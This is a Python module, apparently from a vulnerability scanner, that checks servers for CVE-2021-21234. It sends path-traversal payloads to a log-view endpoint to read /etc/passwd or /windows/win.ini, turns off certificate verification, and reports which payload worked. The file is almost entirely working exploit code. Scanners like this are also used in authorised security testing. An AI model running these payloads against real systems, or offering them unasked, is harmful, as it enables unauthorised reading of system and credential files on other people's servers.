# coding:utf-8

import requests

from util.Translate import tr

class CVE_2021_21234:
    def __init__(self):
        self.payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        self.payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
        self.payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
        self.payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            requests.packages.urllib3.disable_warnings()
            re1 = requests.post(url=url + self.payload1, verify=False, proxies=proxies)
            re2 = requests.post(url=url + self.payload2, verify=False, proxies=proxies)
            re3 = requests.post(url=url + self.payload3, verify=False, proxies=proxies)
            re4 = requests.post(url=url + self.payload4, verify=False, proxies=proxies)
            if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
                result = tr("v.21234.win")
                result1 = f"{url + self.payload1}\n"
                result2 = f"{url + self.payload2}"
                return result + result1 + result2
            elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
                result = tr("v.21234.linux")
                result1 = f"{url + self.payload3}\n"
                result2 = f"{url + self.payload4}"
                return result + result1 + result2
            else:
                result = tr("v.21234.none", url=url)
                return result
        except Exception as e:
            error = tr("v.unknown", url=url, e=e)
            return error
    def exp(self,url,proxies,ProxyStute,cmd):
        # 目录遍历不存在EXP
        pass